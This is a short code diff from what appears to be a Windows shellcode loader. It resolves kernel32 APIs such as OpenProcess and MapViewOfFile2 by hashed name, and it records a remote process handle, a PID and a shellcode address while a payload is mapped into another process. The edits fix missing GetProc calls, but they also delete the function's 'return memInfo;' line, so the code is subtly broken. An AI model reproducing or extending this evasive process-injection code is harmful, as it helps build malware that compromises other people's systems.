@@ -12,10 +12,10 @@
 
 BOOL memory_load_apis() {
 	g_ldr->apis->OpenProcess = (pOpenProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_OPENPROCESS);
-	g_ldr->apis->CreateFileMappingA = (pCreateFileMappingA)(g_ldr->apis->modules.kernel32, HASHED_CREATESECTION);
-	g_ldr->apis->MapViewOfFile2 = (pMapViewOfFile2)(g_ldr->apis->modules.kernel32, HASHED_MAPVIEWOFFILE2);
-	g_ldr->apis->UnmapViewOfFile = (pUnmapViewOfFile)(g_ldr->apis->modules.kernel32, HASHED_UNMAPVIEWOFFILE);
-	g_ldr->apis->CloseHandle = (pCloseHandle)(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);
+	g_ldr->apis->CreateFileMappingA = (pCreateFileMappingA)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATESECTION);
+	g_ldr->apis->MapViewOfFile2 = (pMapViewOfFile2)GetProc(g_ldr->apis->modules.kernel32, HASHED_MAPVIEWOFFILE2);
+	g_ldr->apis->UnmapViewOfFile = (pUnmapViewOfFile)GetProc(g_ldr->apis->modules.kernel32, HASHED_UNMAPVIEWOFFILE);
+	g_ldr->apis->CloseHandle = (pCloseHandle)GetProc(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);
 
 	return g_ldr->apis->OpenProcess && g_ldr->apis->CreateFileMappingA && g_ldr->apis->MapViewOfFile2 && g_ldr->apis->UnmapViewOfFile;
 }
@@ -62,10 +62,10 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 
 	memInfo.ShellCodeAddress = remote;
 	memInfo.BytesWrote = PayloadSize;
+	memInfo.remotePid = pid;
 	memInfo.remoteProcess = hProc;
 	memInfo.ok = TRUE;
 
-	return memInfo;
 
 
 
